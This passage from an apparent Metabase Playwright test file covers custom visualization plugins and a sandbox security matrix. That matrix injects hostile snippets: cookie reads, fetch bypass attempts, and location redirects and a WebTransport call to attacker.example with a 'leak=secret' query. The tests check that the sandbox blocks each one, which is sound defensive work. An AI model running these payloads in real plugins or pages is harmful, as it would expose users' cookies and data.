          window.HTMLAnchorElement.prototype.click = function (
            this: HTMLAnchorElement,
          ) {
            win.__capturedHref = this.getAttribute("href");
            window.HTMLAnchorElement.prototype.click = original;
          };
        });
        await getDashboardCard(page)
          .getByTestId("demo-viz-click-target")
          .click();

        await expect
          .poll(() =>
            page.evaluate(
              () =>
                (window as unknown as { __capturedHref?: string | null })
                  .__capturedHref,
            ),
          )
          .toBe("https://metabase.test/custom-viz");
      });

      test("updates a dashboard filter", async ({ page, mb }) => {
        const parameter = {
          id: "12345678",
          name: "Count",
          slug: "count",
          type: "number/=",
        };

        const dashcard = await createQuestionAndDashboard(mb.api, {
          questionDetails: customVizQuestionDetails,
          dashboardDetails: {
            name: "Custom Viz Crossfilter Dashboard",
            parameters: [parameter],
          },
        });
        await addOrUpdateDashboardCard(mb.api, {
          dashboard_id: dashcard.dashboard_id,
          card_id: dashcard.card_id,
          card: {
            id: dashcard.id,
            visualization_settings: {
              click_behavior: {
                type: "crossfilter",
                parameterMapping: {
                  [parameter.id]: {
                    id: parameter.id,
                    source: { id: "count", name: "Count", type: "column" },
                    target: { id: parameter.id, type: "parameter" },
                  },
                },
              },
            },
          },
        });
        await visitDashboard(page, mb.api, dashcard.dashboard_id);

        await expect(
          getDashboardCard(page).getByText(/Value: \d+/),
        ).toBeVisible();
        await getDashboardCard(page)
          .getByTestId("demo-viz-click-target")
          .click();

        // The crossfilter behavior sets the dashboard parameter to the value of
        // the clicked column.
        await expect
          .poll(() => new URL(page.url()).search)
          .toContain(`${parameter.slug}=${AGGREGATED_VALUE}`);
      });
    });
  });

  test.describe("using a plugin — documents", () => {
    const DOC_QUESTION_NAME = "Custom Viz Doc Question";
    let questionId: number;

    test.beforeEach(async ({ page, mb }) => {
      await mb.api.activateToken("bleeding-edge");
      await mb.api.updateSetting("csp-img-enabled", true);
      await mb.api.updateSetting("custom-viz-enabled", true);
      await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);

      const card = await createQuestion(mb.api, {
        name: DOC_QUESTION_NAME,
        query: {
          "source-table": STATIC_ORDERS_ID,
          aggregation: [["count"]],
        },
        display: CUSTOM_VIZ_DISPLAY,
      });
      questionId = card.id;

      // Query the card once so it appears in the /chart command's recent list.
      await mb.api.post(`/api/card/${questionId}/query`);
    });

    test.describe("regular documents", () => {
      let documentId: number;

      test.beforeEach(async ({ mb }) => {
        const doc = await createDocument(mb.api, {
          name: "Doc with Custom Viz",
          document: buildDocumentWithCustomVizCard(questionId),
          collection_id: null,
        });
        documentId = doc.id;
      });

      test("renders the custom viz when the document is opened", async ({
        page,
      }) => {
        const pluginBundle = waitForPluginBundle(page);
        await visitDocument(page, documentId);
        await pluginBundle;

        const card = getDocumentCard(page, DOC_QUESTION_NAME);
        await expect(
          card.getByText("Custom viz rendered successfully"),
        ).toBeVisible();
        await expect(card.getByText(/Value: \d+/)).toBeVisible();
      });

      test("falls back to the default visualization when the plugin bundle fails to load", async ({
        page,
      }) => {
        const failedBundle = interceptFailingBundle(page, {
          status: 500,
          body: "boom",
        });

        await visitDocument(page, documentId);
        await failedBundle;

        const card = getDocumentCard(page, DOC_QUESTION_NAME);
        await expect(
          card.getByText("Custom viz rendered successfully"),
        ).toHaveCount(0);
        await expect(card.getByTestId("table-root")).toBeVisible();
      });
    });

    test.describe("inserting via / command", () => {
      let documentId: number;

      test.beforeEach(async ({ mb }) => {
        const doc = await createDocument(mb.api, {
          name: "Empty Doc",
          document: {
            type: "doc",
            content: [{ type: "paragraph", attrs: { _id: "1" } }],
          },
          collection_id: null,
        });
        documentId = doc.id;
      });

      test("renders the custom viz when added via the /chart command", async ({
        page,
      }) => {
        const pluginBundle = waitForPluginBundle(page);
        await visitDocument(page, documentId);

        await documentContent(page).click();
        await addToDocument(page, "/", false);
        await commandSuggestionItem(page, "Chart").click();
        await commandSuggestionDialog(page).getByText(DOC_QUESTION_NAME).click();

        await pluginBundle;

        await expect(
          getDocumentCard(page, DOC_QUESTION_NAME).getByText(
            "Custom viz rendered successfully",
          ),
        ).toBeVisible();
      });
    });

    test.describe("public sharing", () => {
      let documentId: number;

      test.beforeEach(async ({ mb }) => {
        await mb.api.updateSetting("enable-public-sharing", true);

        const doc = await createDocument(mb.api, {
          name: "Public Doc with Custom Viz",
          document: buildDocumentWithCustomVizCard(questionId),
          collection_id: null,
        });
        documentId = doc.id;
      });

      test("falls back to the default viz on a public document", async ({
        page,
        mb,
      }) => {
        const uuid = await createPublicDocumentLink(mb.api, documentId);
        await mb.signOut();
        await visitPublicDocument(page, uuid);

        await expect(
          getDocumentCard(page, DOC_QUESTION_NAME).getByTestId("table-root"),
        ).toBeVisible();
      });
    });
  });

  test.describe("icon rendering across the app", () => {
    const ICON_QUESTION_NAME = "Custom Viz Icon Test";
    const UNPINNED_QUESTION_NAME = "Custom Viz Icon Test — List";
    const DASHBOARD_NAME = "Custom Viz Icon Dashboard";
    const DOC_NAME = "Custom Viz Icon Document";
    // EntityIcon renders as a CSS-masked span whose `mask-image: url(...)`
    // points at /api/ee/custom-viz-plugin/:id/asset?path=icon.svg. Matching on
    // that URL fragment is the most stable signal that the plugin icon is
    // actually rendered — build-agnostic (no CSS-module class name).
    const PLUGIN_ICON_SELECTOR = 'span[style*="custom-viz-plugin"]';

    let iconQuestionId: number;
    let dashboardId: number;
    let documentId: number;

    test.beforeEach(async ({ page, mb }) => {
      await mb.api.activateToken("bleeding-edge");
      await mb.api.updateSetting("csp-img-enabled", true);
      await mb.api.updateSetting("custom-viz-enabled", true);
      await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);

      // Main question: pinned with preview hidden so the pinned card shows the
      // plugin icon instead of the rendered viz. Also bookmarked, queried (for
      // recents), and embedded in a document below.
      const iconQuestion = await createQuestion(mb.api, {
        name: ICON_QUESTION_NAME,
        query: {
          "source-table": STATIC_ORDERS_ID,
          aggregation: [["count"]],
        },
        display: CUSTOM_VIZ_DISPLAY,
      });
      iconQuestionId = iconQuestion.id;
      await mb.api.put(`/api/card/${iconQuestionId}`, {
        collection_position: 1,
        collection_preview: false,
      });
      await mb.api.post(`/api/card/${iconQuestionId}/query`);
      await mb.api.post(`/api/bookmark/card/${iconQuestionId}`);

      // Secondary unpinned question — used to assert the icon on a regular
      // (non-pinned) collection list row.
      await createQuestion(mb.api, {
        name: UNPINNED_QUESTION_NAME,
        query: {
          "source-table": STATIC_ORDERS_ID,
          aggregation: [["count"]],
        },
        display: CUSTOM_VIZ_DISPLAY,
      });

      const dashboard = await createDashboard(mb.api, { name: DASHBOARD_NAME });
      dashboardId = dashboard.id;
      await mb.api.post(`/api/bookmark/dashboard/${dashboardId}`);

      const doc = await createDocument(mb.api, {
        name: DOC_NAME,
        document: buildDocumentWithCustomVizCard(iconQuestionId),
        collection_id: null,
      });
      documentId = doc.id;
      await mb.api.post(`/api/bookmark/document/${documentId}`);
    });

    test("renders the custom-viz icon in the entity picker data-source modal", async ({
      page,
    }) => {
      await startNewQuestion(page);
      await miniPickerBrowseAll(page).click();

      const modalScope = entityPickerModal(page);
      await expect(modalScope).toBeVisible();
      await entityPickerModalItem(page, 0, "Our analytics").click();
      // Upstream `.find(SEL).should("exist")` is an at-least-one check.
      await expect(
        entityPickerModalItem(page, 1, ICON_QUESTION_NAME)
          .locator(PLUGIN_ICON_SELECTOR)
          .first(),
      ).toBeAttached();
    });

    test("renders the custom-viz icon across app surfaces when navigating through the UI", async ({
      page,
    }) => {
      // Navigation sidebar bookmark
      await page.goto("/collection/root");

      // Upstream `.find(SEL).should("exist")` throughout is an at-least-one
      // check — some rows render the plugin icon span more than once.
      await expect(
        navigationSidebar(page)
          .getByRole("link", { name: new RegExp(ICON_QUESTION_NAME) })
          .locator(PLUGIN_ICON_SELECTOR)
          .first(),
      ).toBeAttached();

      // Unpinned collection list row
      await expect(
        page
          .getByRole("row", { name: new RegExp(UNPINNED_QUESTION_NAME) })
          .locator(PLUGIN_ICON_SELECTOR)
          .first(),
      ).toBeAttached();

      // Pinned section (collection_preview: false → icon, not viz)
      await expect(
        getPinnedSection(page).locator(PLUGIN_ICON_SELECTOR).first(),
      ).toBeVisible();

      // Navigate → question editor by clicking the pinned card title
      const pluginBundle = waitForPluginBundle(page);
      await getPinnedSection(page).getByText(ICON_QUESTION_NAME).click();
      await pluginBundle;

      // Chart type sidebar on the question editor
      await openVizTypeSidebar(page);
      await expect(
        vizTypeSidebar(page).getByRole("img", { name: "demo-viz" }),
      ).toBeVisible();
      await openVizTypeSidebar(page);

      // Command palette option row
      await commandPaletteSearch(page, ICON_QUESTION_NAME);
      await expect(
        commandPalette(page)
          .getByRole("option", { name: new RegExp(ICON_QUESTION_NAME) })
          .first()
          .locator(PLUGIN_ICON_SELECTOR),
      ).toBeVisible();

      // Search results page — reached by clicking "View and filter all …"
      await commandPalette(page)
        .getByText(/View and filter all .* results/)
        .click();
      await expect(
        page
          .getByTestId("search-result-item")
          .filter({ hasText: ICON_QUESTION_NAME })
          .first()
          .locator(PLUGIN_ICON_SELECTOR)
          .first(),
      ).toBeAttached();

      // Navigate → home via the nav-sidebar "Home" link
      await openNavigationSidebar(page);
      await navigationSidebar(page).getByText("Home").click();

      // Home recently-viewed section
      await expect(
        main(page)
          .getByText("Pick up where you left off")
          .locator("xpath=..")
          .getByRole("link", { name: new RegExp(ICON_QUESTION_NAME) })
          .locator(PLUGIN_ICON_SELECTOR)
          .first(),
      ).toBeAttached();

      // Navigate → dashboard via bookmark link in the nav sidebar
      await openNavigationSidebar(page);
      await navigationSidebar(page)
        .getByRole("link", { name: new RegExp(DASHBOARD_NAME) })
        .click();

      // Dashboard add-questions sidesheet
      await editDashboard(page);
      await openQuestionsSidebar(page);
      await expect(
        page
          .getByTestId("add-card-sidebar")
          .getByRole("menuitem", { name: ICON_QUESTION_NAME })
          .locator(PLUGIN_ICON_SELECTOR)
          .first(),
      ).toBeAttached();

      // Exit edit mode so the next click-to-navigate isn't blocked by an
      // unsaved-changes prompt.
      await page.getByRole("button", { name: /Cancel/i }).click();

      // Navigate → document via bookmark link
      await openNavigationSidebar(page);
      await navigationSidebar(page)
        .getByRole("link", { name: new RegExp(DOC_NAME) })
        .click();

      // Document mention dialog (@ suggestions). Click into the intro paragraph
      // — clicking blindly on document-content may land on the embedded card.
      await documentContent(page).getByText("Custom viz embedded below:").click();
      await page.keyboard.press("End");
      await page.keyboard.type(" @", { delay: 25 });
      await expect(documentMentionDialog(page)).toBeVisible();
      await page.keyboard.type("Custom", { delay: 25 });

      // Both the pinned and the unpinned questions appear — assert the icon
      // renders on every matching option.
      const options = documentMentionDialog(page).getByRole("option", {
        name: new RegExp(ICON_QUESTION_NAME),
      });
      await expect
        .poll(async () => await options.count())
        .toBeGreaterThanOrEqual(2);
      const count = await options.count();
      for (let i = 0; i < count; i++) {
        await expect(
          options.nth(i).locator(PLUGIN_ICON_SELECTOR).first(),
        ).toBeAttached();
      }
      await page.keyboard.press("Escape");

      // Document "Visualize as" panel on the embedded card
      await openDocumentCardMenu(page, ICON_QUESTION_NAME);
      await popover(page).getByText("Edit Visualization").click();
      await getDocumentSidebar(page)
        .getByRole("button", { name: /demo-viz/i })
        .click();
      await expect(
        page
          .getByRole("menu")
          .getByRole("menuitem", { name: /demo-viz/i })
          .locator(PLUGIN_ICON_SELECTOR)
          .first(),
      ).toBeAttached();
    });
  });

  test.describe("development mode", () => {
    // Gate-skipped: the upstream test builds the custom-viz SDK, scaffolds a
    // project via the CLI, `npm i`s it, and spawns a Vite dev server on :5174
    // via cy.task("startCustomVizDevServer"), then verifies hot reload. None of
    // that node-task/dev-server orchestration exists in the Playwright harness.
    test.fixme(
      "should load a dev-only plugin from a local dev server URL and use it in a question",
      async () => {},
    );
  });
});

// ===========================================================================
// sandbox (near-membrane-dom) security matrix
// ===========================================================================

type SandboxCase = {
  name: string;
  payload: string;
  errorPattern: RegExp;
  usesCanary?: boolean;
};

const blockedPattern = (suffix: RegExp) =>
  new RegExp(String.raw`\[plugin \d+\] blocked ${suffix.source}`);

const SANDBOX_CASES: SandboxCase[] = [
  {
    name: "window.fetch",
    payload: 'window.fetch("/api/canary-should-be-blocked-by-sandbox");',
    errorPattern: blockedPattern(/API call: window\.fetch/),
    usesCanary: true,
  },
  {
    name: "document.open",
    payload: 'document.open("https://evilsite.example");',
    errorPattern: blockedPattern(/API call: Document\.open/),
  },
  {
    name: "document.cookie getter",
    payload: "var stolen = document.cookie;",
    errorPattern: blockedPattern(/API call: Document\.get cookie/),
  },
  {
    name: "window.cookieStore getter",
    payload: "var x = window.cookieStore;",
    errorPattern: blockedPattern(/API call: Window\.get cookieStore/),
  },
  {
    name: "StorageEvent.newValue getter",
    payload:
      'var e = new StorageEvent("storage", { newValue: "secret" }); var x = e.newValue;',
    errorPattern: blockedPattern(/API call: StorageEvent\.get newValue/),
  },
  {
    name: 'document.addEventListener("keydown")',
    payload: 'document.addEventListener("keydown", function(){}, true);',
    errorPattern: blockedPattern(
      /addEventListener for global event type: keydown/,
    ),
  },
  {
    name: 'document.addEventListener("paste")',
    payload: 'document.addEventListener("paste", function(){}, true);',
    errorPattern: blockedPattern(
      /addEventListener for global event type: paste/,
    ),
  },
  {
    name: 'window.addEventListener("storage")',
    payload: 'window.addEventListener("storage", function(){});',
    errorPattern: blockedPattern(
      /addEventListener for global event type: storage/,
    ),
  },
  {
    name: 'setAttribute("onclick", ...)',
    payload: 'document.body.setAttribute("onclick", "alert(1)");',
    errorPattern: blockedPattern(
      /setAttribute for inline event handler: onclick/,
    ),
  },
  {
    name: "navigator.clipboard",
    payload: "var c = navigator.clipboard;",
    errorPattern: blockedPattern(/API call: Navigator\.get clipboard/),
  },
  {
    name: 'createElement("script")',
    payload: 'document.createElement("script");',
    errorPattern: blockedPattern(/createElement: script/),
  },
  {
    name: 'createElement("a")',
    payload: 'document.createElement("a");',
    errorPattern: blockedPattern(/createElement: a/),
  },
  {
    name: 'createElement("style")',
    payload: 'document.createElement("style");',
    errorPattern: blockedPattern(/createElement: style/),
  },
  {
    name: 'createElement("area")',
    payload: 'document.createElement("area");',
    errorPattern: blockedPattern(/createElement: area/),
  },
  {
    name: 'createElement("video")',
    payload: 'document.createElement("video");',
    errorPattern: blockedPattern(/createElement: video/),
  },
  {
    name: 'createElement("input")',
    payload: 'document.createElement("input");',
    errorPattern: blockedPattern(/createElement: input/),
  },
  {
    name: 'createElementNS(SVG, "use")',
    payload: 'document.createElementNS("http://www.w3.org/2000/svg", "use");',
    errorPattern: blockedPattern(/createElementNS: use/),
  },
  {
    name: "eval-evaluated fetch",
    payload:
      "eval('window.fetch(\"/api/canary-should-be-blocked-by-sandbox\")');",
    errorPattern: blockedPattern(/API call: window\.fetch/),
    usesCanary: true,
  },
  {
    name: "XMLHttpRequest",
    payload: "new XMLHttpRequest();",
    errorPattern: blockedPattern(/API call: window\.XMLHttpRequest/),
  },
  {
    name: "document.cookie setter",
    payload: 'document.cookie = "${document.cookie}stolen=1;";',
    errorPattern: blockedPattern(/API call: Document\.set cookie/),
  },
  {
    name: "window.open",
    payload: 'window.open("/api/canary-should-be-blocked-by-sandbox");',
    errorPattern: blockedPattern(/API call: window\.open/),
    usesCanary: true,
  },
  {
    name: "document.write",
    payload: 'document.write("<p>injected</p>");',
    errorPattern: blockedPattern(/API call: Document\.write/),
  },
  {
    name: 'setAttribute("onerror", ...)',
    payload: 'document.body.setAttribute("onerror", "alert(1)");',
    errorPattern: blockedPattern(
      /setAttribute for inline event handler: onerror/,
    ),
  },
  {
    name: 'setAttribute("href", "javascript:...")',
    payload: 'document.body.setAttribute("href", "javascript:alert(1)");',
    errorPattern: blockedPattern(/setAttribute with javascript: URL: href/),
  },
  {
    name: "window.fetch.bind(window) bypass attempt",
    payload:
      'window.fetch.bind(window)("/api/canary-should-be-blocked-by-sandbox");',
    errorPattern: blockedPattern(/API call: window\.fetch/),
    usesCanary: true,
  },
  {
    name: "Function.prototype.bind.call(window.fetch, ...) bypass attempt",
    payload:
      'Function.prototype.bind.call(window.fetch, window)("/api/canary-should-be-blocked-by-sandbox");',
    errorPattern: blockedPattern(/API call: window\.fetch/),
    usesCanary: true,
  },
  {
    name: "Worker constructor",
    payload: 'new Worker("data:text/javascript,1");',
    errorPattern: blockedPattern(/API call: window\.Worker/),
  },
  {
    name: "SharedWorker constructor",
    payload: 'new SharedWorker("data:text/javascript,1");',
    errorPattern: blockedPattern(/API call: window\.SharedWorker/),
  },
  {
    name: "RTCPeerConnection constructor",
    payload: "new RTCPeerConnection();",
    errorPattern: blockedPattern(/API call: window\.RTCPeerConnection/),
  },
  {
    name: "WebTransport constructor",
    payload: 'new WebTransport("https://attacker.example/wt");',
    errorPattern: blockedPattern(/API call: WebTransport/),
  },
  {
    name: "BroadcastChannel constructor",
    payload: 'new BroadcastChannel("attacker");',
    errorPattern: blockedPattern(/API call: BroadcastChannel/),
  },
  {
    name: "Range.createContextualFragment",
    payload:
      'document.createRange().createContextualFragment("<img src=x>");',
    errorPattern: blockedPattern(/API call: Range\.createContextualFragment/),
  },
  {
    name: "DOMParser.parseFromString",
    payload: 'new DOMParser().parseFromString("<p>x</p>", "text/html");',
    errorPattern: blockedPattern(/API call: DOMParser\.parseFromString/),
  },
  {
    name: "Element.setHTMLUnsafe",
    payload: 'document.createElement("div").setHTMLUnsafe("<x>");',
    errorPattern: blockedPattern(/API call: Element\.setHTMLUnsafe/),
  },
  {
    name: "Document.parseHTMLUnsafe",
    payload: 'Document.parseHTMLUnsafe("<p>x</p>");',
    errorPattern: blockedPattern(/API call: Document\.parseHTMLUnsafe/),
  },
  {
    name: "XSLTProcessor constructor",
    payload: "new XSLTProcessor();",
    errorPattern: blockedPattern(/API call: XSLTProcessor/),
  },
  {
    name: "window.alert",
    payload: 'window.alert("pwned");',
    errorPattern: blockedPattern(/API call: window\.alert/),
  },
  {
    name: "window.confirm",
    payload: 'window.confirm("pwned");',
    errorPattern: blockedPattern(/API call: window\.confirm/),
  },
  {
    name: "window.prompt",
    payload: 'window.prompt("pwned");',
    errorPattern: blockedPattern(/API call: window\.prompt/),
  },
  {
    name: "window.print",
    payload: "window.print();",
    errorPattern: blockedPattern(/API call: window\.print/),
  },
  {
    name: "Notification constructor",
    payload: 'new Notification("phish");',
    errorPattern: blockedPattern(/API call: window\.Notification/),
  },
  {
    name: "HTMLElement.click()",
    payload: 'document.createElement("div").click();',
    errorPattern: blockedPattern(/API call: HTMLElement\.click/),
  },
  {
    name: "FontFace.load",
    payload:
      'new FontFace("x", "url(/api/canary-should-be-blocked-by-sandbox)").load();',
    errorPattern: blockedPattern(/API call: FontFace\.load/),
    usesCanary: true,
  },
  {
    name: "document.adoptedStyleSheets setter",
    payload: "document.adoptedStyleSheets = [];",
    errorPattern: blockedPattern(/API call: Document\.set adoptedStyleSheets/),
  },
  {
    name: "document.adoptedStyleSheets getter",
    payload: "var x = document.adoptedStyleSheets;",
    errorPattern: blockedPattern(/API call: Document\.get adoptedStyleSheets/),
  },
  {
    name: "ShadowRoot.adoptedStyleSheets setter",
    payload:
      'document.createElement("div").attachShadow({ mode: "open" }).adoptedStyleSheets = [];',
    errorPattern: blockedPattern(
      /API call: ShadowRoot\.set adoptedStyleSheets/,
    ),
  },
  {
    name: "CSSStyleSheet.replaceSync",
    payload: 'new CSSStyleSheet().replaceSync("");',
    errorPattern: blockedPattern(/API call: CSSStyleSheet\.replaceSync/),
  },
  {
    name: "history.state getter",
    payload: "var x = history.state;",
    errorPattern: blockedPattern(/API call: History\.get state/),
  },
  {
    name: "performance.getEntries",
    payload: "performance.getEntries();",
    errorPattern: blockedPattern(/API call: Performance\.getEntries/),
  },
  {
    name: "PerformanceObserver constructor",
    payload: "new PerformanceObserver(function() {});",
    errorPattern: blockedPattern(/API call: PerformanceObserver/),
  },
  {
    name: "document.referrer getter",
    payload: "var x = document.referrer;",
    errorPattern: blockedPattern(/API call: Document\.get referrer/),
  },
  {
    name: "document.URL getter",
    payload: "var x = document.URL;",
    errorPattern: blockedPattern(/API call: Document\.get URL/),
  },
  {
    name: "document.documentURI getter",
    payload: "var x = document.documentURI;",
    errorPattern: blockedPattern(/API call: Document\.get documentURI/),
  },
  {
    name: "document.baseURI getter",
    payload: "var x = document.baseURI;",
    errorPattern: blockedPattern(/API call: Node\.get baseURI/),
  },
  {
    name: "document.designMode setter",
    payload: 'document.designMode = "on";',
    errorPattern: blockedPattern(/API call: Document\.set designMode/),
  },
  {
    name: "element.contentEditable setter",
    payload: 'document.createElement("div").contentEditable = "true";',
    errorPattern: blockedPattern(/API call: HTMLElement\.set contentEditable/),
  },
  {
    name: "HTMLDialogElement.showModal",
    payload: 'document.createElement("dialog").showModal();',
    errorPattern: blockedPattern(/API call: HTMLDialogElement\.showModal/),
  },
  {
    name: "Element.requestFullscreen",
    payload: 'document.createElement("div").requestFullscreen();',
    errorPattern: blockedPattern(/API call: Element\.requestFullscreen/),
  },
  {
    name: "PaymentRequest constructor",
    payload: "new PaymentRequest([], {});",
    errorPattern: blockedPattern(/API call: PaymentRequest/),
  },
  {
    name: "Attr.value setter (onclick handler)",
    payload: `
      var attr = document.createAttribute("onclick");
      attr.value = "alert(1)";
    `,
    errorPattern: blockedPattern(
      /Attr\.set value for inline event handler: onclick/,
    ),
  },
  {
    name: "Attr.value setter (post-hoc javascript: URL)",
    payload: `
      document.body.setAttribute("href", "/safe");
      var attr = document.body.getAttributeNode("href");
      attr.value = "javascript:alert(1)";
    `,
    errorPattern: blockedPattern(/Attr\.set value with javascript: URL: href/),
  },
  {
    name: "ShadowRoot.setHTMLUnsafe",
    payload:
      'document.createElement("div").attachShadow({ mode: "open" }).setHTMLUnsafe("<x>");',
    errorPattern: blockedPattern(/API call: ShadowRoot\.setHTMLUnsafe/),
  },
  {
    name: "Document.caretRangeFromPoint",
    payload: "document.caretRangeFromPoint(0, 0);",
    errorPattern: blockedPattern(/API call: Document\.caretRangeFromPoint/),
  },
];

test.describe("sandbox", () => {
  let sandboxCardId: number;

  test.beforeEach(async ({ page, mb }) => {
    await mb.restore("default");
    await mb.signInAsAdmin();
    await mb.api.activateToken("bleeding-edge");
    await mb.api.updateSetting("csp-img-enabled", true);
    await mb.api.updateSetting("custom-viz-enabled", true);
    await addCustomVizPlugin(page, CUSTOM_VIZ_FIXTURE_TGZ);
    const card = await createQuestion(mb.api, {
      name: "Custom Viz Sandbox Test",
      query: {
        "source-table": STATIC_ORDERS_ID,
        aggregation: [["count"]],
      },
      display: CUSTOM_VIZ_DISPLAY,
    });
    sandboxCardId = card.id;
  });

  test("blocks browser APIs that are not allowed in the sandbox", async ({
    page,
  }) => {
    const consoleEntries = collectConsole(page);
    const canaryCount = countCanaryRequests(page);

    const bundle = SANDBOX_CASES.map((c, index) => {
      const delay = 1000 + index * 100;
      return `window.setTimeout(function() { try { ${c.payload} } catch (e) { console.error(e); } }, ${delay});`;
    }).join("\n");

    const injected = interceptInjectedBundle(
      page,
      (body) => `console.log("injected bundle");${bundle}\n${body};\n`,
    );

    await visitQuestion(page, sandboxCardId);
    await injected;
    await expectConsoleCalledWith(consoleEntries, "injected bundle");

    for (const { name, errorPattern } of SANDBOX_CASES) {
      await expectConsoleErrorMatch(consoleEntries, errorPattern, name);
    }

    // No canary request ever left the sandbox.
    expect(canaryCount()).toBe(0);
  });

  test("plugin location operations do not navigate the host", async ({
    page,
  }) => {
    const payloads = [
      'location.href = "https://attacker.example/?leak=secret";',
      'location.assign("https://attacker.example/");',
      'location.replace("https://attacker.example/");',
      'window.location = "https://attacker.example/";',
      'location.pathname = "/attacker-pwned";',
      'location.search = "?attacker-pwned=1";',
      'location.hash = "#attacker-pwned";',
    ];
    const attackBundle = payloads
      .map((p) => `try { ${p} } catch (e) {}`)
      .join("\n");

    const injected = interceptInjectedBundle(
      page,
      (body) => `${attackBundle}\n${body};\n`,
    );

    await visitQuestion(page, sandboxCardId);
    await injected;

    await expect(
      page.getByRole("heading", { name: "Custom viz rendered successfully" }),
    ).toBeVisible();

    await expect.poll(() => new URL(page.url()).pathname).toMatch(/\/question/);
    expect(page.url()).not.toContain("attacker");
    expect(new URL(page.url()).search).not.toContain("attacker-pwned");
    expect(new URL(page.url()).hash).not.toContain("attacker-pwned");
  });

  test("sanitizes innerHTML through DOMPurify before it reaches the DOM", async ({
    page,
  }) => {
    const consoleEntries = collectConsole(page);
    const canaryCount = countCanaryRequests(page);

    const payload = `
      var d = document.createElement('div');
      d.innerHTML = '<img src="x" onerror="fetch(\\'/api/canary-should-be-blocked-by-sandbox\\')">';
      document.body.appendChild(d);
    `;

    const injected = interceptInjectedBundle(
      page,
      (body) => `${payload}\n${body};\n`,
    );

    await visitQuestion(page, sandboxCardId);
    await injected;

    // Viz still renders — sanitization mutates the HTML but doesn't throw.
    await expect(
      page.getByRole("heading", { name: "Custom viz rendered successfully" }),
    ).toBeVisible();
    expect(canaryCount()).toBe(0);
    await expectConsoleMatch(
      consoleEntries,
      /\[plugin \d+\] DOMPurify stripped content from innerHTML/,
    );
  });

  test("sanitizes ShadowRoot.innerHTML through DOMPurify before it reaches the DOM", async ({
    page,
  }) => {
    const consoleEntries = collectConsole(page);
    const canaryCount = countCanaryRequests(page);

    const payload = `
      var host = document.createElement('div');
      var shadow = host.attachShadow({ mode: 'open' });
      shadow.innerHTML = '<img src="x" onerror="fetch(\\'/api/canary-should-be-blocked-by-sandbox\\')">';
      document.body.appendChild(host);
    `;

    const injected = interceptInjectedBundle(
      page,
      (body) => `${payload}\n${body};\n`,
    );

    await visitQuestion(page, sandboxCardId);
    await injected;

    await expect(
      page.getByRole("heading", { name: "Custom viz rendered successfully" }),
    ).toBeVisible();
    expect(canaryCount()).toBe(0);
    await expectConsoleMatch(
      consoleEntries,
      /\[plugin \d+\] DOMPurify stripped content from ShadowRoot\.innerHTML/,
    );
  });

  test("decoys non-Element nodes reached via TreeWalker rooted at document", async ({
    page,
  }) => {
    const consoleEntries = collectConsole(page);
    const HOST_MARKER_TEXT = "treewalker-host-canary-do-not-leak";

    const payload = `
      setTimeout(function() {
        var walker = document.createTreeWalker(document, NodeFilter.SHOW_TEXT);
        var sawMarker = false;
        var node;
        let nonEmptyCount = 0;
        while ((node = walker.nextNode())) {
          if ((node.textContent || "").indexOf(${JSON.stringify(HOST_MARKER_TEXT)}) !== -1) {
            sawMarker = true;
            break;
          }
          if (node.textContent && node.textContent.trim() !== "") {
            nonEmptyCount++;
          }
        }
        console.log('plugin treewalker(document) saw host marker:', sawMarker);
        console.log('plugin treewalker(document) saw non-empty nodes:', nonEmptyCount);
      }, 1500);
    `;

    const injected = interceptInjectedBundle(
      page,
      (body) => `${payload}\n${body};\n`,
    );

    await visitQuestion(page, sandboxCardId);
    await injected;

    await page.evaluate((marker) => {
      const el = document.createElement("span");
      el.id = "treewalker-host-marker";
      el.textContent = marker;
      document.body.appendChild(el);
    }, HOST_MARKER_TEXT);

    await expect(
      page.getByRole("heading", { name: "Custom viz rendered successfully" }),
    ).toBeVisible();

    await expectConsoleCalledWith(
      consoleEntries,
      "plugin treewalker(document) saw host marker:",
      false,
    );
    await expectConsoleCalledWith(
      consoleEntries,
      "plugin treewalker(document) saw non-empty nodes:",
      13,
    );
  });

  test("does not expose host-app globals to the plugin", async ({ page }) => {
    const consoleEntries = collectConsole(page);

    const payload = `
      setTimeout(function() {
        console.log("plugin sees MetabaseBootstrap:", typeof window.MetabaseBootstrap);
        try {
          console.log(
            "plugin sees parent.MetabaseBootstrap:",
            typeof (window.parent && window.parent.MetabaseBootstrap)
          );
        } catch (e) {
          console.log("plugin sees parent.MetabaseBootstrap:", "throws");
        }

        try {
          console.log(
            "plugin sees defaultView.MetabaseBootstrap:",
            typeof (document.defaultView && document.defaultView.MetabaseBootstrap)
          );
        } catch (e) {
          console.log("plugin sees defaultView.MetabaseBootstrap:", "throws");
        }
        console.log("plugin sees MetabaseUserLocalization:", typeof window.MetabaseUserLocalization);
        console.log("plugin sees MetabaseSiteLocalization:", typeof window.MetabaseSiteLocalization);
        console.log("plugin sees SECRET:", typeof window.SECRET);
      }, 500);
    `;

    const injected = interceptInjectedBundle(
      page,
      (body) => `${payload}\n${body};\n`,
    );

    await visitQuestion(page, sandboxCardId);
    await page.evaluate(() => {
      (window as unknown as { SECRET?: string }).SECRET = "abracadabra";
    });
    await injected;

    await expect(
      page.getByRole("heading", { name: "Custom viz rendered successfully" }),
    ).toBeVisible();

    await expectConsoleCalledWith(
      consoleEntries,
      "plugin sees MetabaseBootstrap:",
      "undefined",
    );
    await expectConsoleCalledWith(
      consoleEntries,
      "plugin sees parent.MetabaseBootstrap:",
      "undefined",
    );
    await expectConsoleCalledWith(
      consoleEntries,
      "plugin sees defaultView.MetabaseBootstrap:",
      "undefined",
    );
    await expectConsoleCalledWith(
      consoleEntries,
      "plugin sees MetabaseUserLocalization:",
      "undefined",
    );
    await expectConsoleCalledWith(
      consoleEntries,
      "plugin sees MetabaseSiteLocalization:",
      "undefined",
    );
  });

  test("isolates DOM access to the plugin subtree (out-of-scope reads and writes hit a decoy)", async ({
    page,
  }) => {
    const consoleEntries = collectConsole(page);
    const hostSelector = "#root";
    const payload = `
      var hostEl = document.querySelector('${hostSelector}');
      if (hostEl) {
        const elementId = hostEl.getAttribute("id");
        hostEl.setAttribute('data-pwned-by-plugin', 'true');
        console.log('plugin read element id', elementId);
        console.log('plugin saw decoy', hostEl.getAttribute('data-plugin-sandbox-decoy'));
      } else {
        console.log('plugin-saw-decoy', false);
      }
    `;

    const injected = interceptInjectedBundle(
      page,
      (body) => `${payload}\n${body};\n`,
    );

    await visitQuestion(page, sandboxCardId);
    await injected;

    await expect(
      page.getByRole("heading", { name: "Custom viz rendered successfully" }),
    ).toBeVisible();

